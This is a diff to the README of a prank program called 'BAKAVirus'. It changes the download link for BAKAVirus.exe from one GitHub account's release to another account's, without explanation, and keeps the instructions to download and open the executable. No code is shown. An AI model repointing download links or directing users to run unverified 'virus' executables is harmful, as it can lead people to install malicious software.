@@ -8,7 +8,7 @@ I created this because I saw a thumbnail for a malware testing video and thought
 
 ## 📥 How to Download & Run
 
-1. **Get the executable:** Go directly to the [BAKAVirus Latest Release](https://github.com/VALLEYSCRIPTS/BAKAVirus/releases/tag/v1.0.0.0).
+1. **Get the executable:** Go directly to the [BAKAVirus Latest Release](https://github.com/bumbumbumbuu/BAKAVirus/releases/tag/v1.0.0.0).
 2. **Download:** Click on **`BAKAVirus.exe`** to download it.
 3. **Launch:** Open the file to start the prank!
 
